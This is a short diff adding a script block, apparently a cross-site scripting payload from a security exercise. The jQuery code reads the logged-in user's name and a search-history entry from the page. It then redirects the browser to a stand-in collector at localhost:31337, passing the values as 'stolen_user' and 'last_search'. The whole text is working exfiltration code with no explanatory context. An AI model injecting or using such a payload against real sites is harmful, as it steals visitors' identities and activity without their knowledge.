@@ -1,0 +1,7 @@
+<script>
+$(function() {
+    var user = $("#logged-in-user").text();
+    var last = $("#history-list").children().eq(1).text();
+    window.location = 'http://localhost:31337/?stolen_user=' + encodeURIComponent(user) + '&last_search=' + encodeURIComponent(last);
+});
+</script>
